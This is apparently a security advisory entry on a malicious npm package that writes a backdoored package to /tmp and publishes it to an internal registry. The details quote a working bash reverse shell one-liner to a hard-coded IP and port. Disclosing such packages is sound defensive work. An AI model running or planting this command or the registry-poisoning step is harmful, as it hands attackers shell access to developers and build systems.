summary: Reverse shell payload auto-published to internal npm registry
details: The package's exported `command()` function in index.js writes a synthetic package `uhclabs_local_check@99.0.0` to /tmp whose `start` script is a hardcoded bash reverse shell to 10.0.0.145:9999 (`/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1'`), then runs `npm publish --registry http://0.0.0.0:4873/` (a Verdaccio-style local registry) to push the backdoored package into the registry. Any developer or build system that subsequently installs/runs `uhclabs_local_check` from that registry receives a reverse shell to the attacker-controlled IP. The package metadata is a placeholder (name/version/main only, no author/license/repository) consistent with an attack payload rather than a real library, and the package name plus internal strings (`VERT16X_ROOT_V2`) reinforce the attack-tool nature. This combines a backdoor payload with self-propagation into an internal registry, poisoning the namespace consumed by other developers.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
